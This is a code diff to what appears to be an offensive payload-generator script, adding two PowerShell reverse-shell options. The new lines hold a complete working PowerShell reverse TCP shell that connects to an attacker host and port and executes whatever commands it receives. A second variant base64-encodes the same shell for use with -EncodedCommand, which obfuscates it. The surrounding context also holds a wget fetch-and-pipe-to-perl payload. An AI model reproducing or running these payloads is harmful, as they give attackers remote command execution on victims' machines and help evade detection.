@@ -33,6 +33,7 @@ import base64
 import binascii
 import urllib as ul
 import netifaces as ni
+import commands
 
 # Make output more verbose
 VERBOSE = True
@@ -595,6 +596,8 @@ Simplifies payload creation and listener.
     curlrunp <LHOST> <LPORT>  |   Curl download and pipe to perl
     wgetrun  <LHOST> <LPORT>  |   Wget download pipe to bash
     wgetrunp <LHOST> <LPORT>  |   Wget download pipe to perl
+    pshell   <LHOST> <LPORT>  |   Powershell ReverseTCP
+    pshelle  <LHOST> <LPORT>  |   Powershell ReverseTCP Encoded
   <~~~~~~~~~~~~~~~~~~~~~~~[Win Payloads CLI]~~~~~~~~~~~~~~~~~~~~~~~>
                               |
     winhttp  <LHOST> <LPORT>  |    windows download and execute
@@ -888,6 +891,32 @@ cscript wget.vbs http://%s:%s/%s %s
         _payload = '''wget -q -O - http://%s:%s/%s|perl  ''' % (lhost, lport, file)
         print('')
         print(_payload)
+        print('')
+        sys.exit(0)
+
+    if type == 'pshell':
+
+        _payload = '''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'''
+        _payload = _payload.replace('LHOST', lhost)
+        _payload = _payload.replace('LPORT', lport)
+        print('')
+        print(_payload)
+        print('')
+        sys.exit(0)
+
+    if type == 'pshelle':
+
+        _payload = '''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'''
+        _payload = _payload.replace('LHOST', lhost)
+        _payload = _payload.replace('LPORT', lport)
+
+        with open('/tmp/payload.txt', 'w') as file_payload:
+            file_payload.write(_payload)
+
+        (_status, _output) = commands.getstatusoutput('iconv -f ASCII -t UTF-16LE /tmp/payload.txt |base64 -w 0 |xargs')
+
+        print('')
+        print("powershell.exe -EncodedCommand %s" %_output)
         print('')
         sys.exit(0)
 
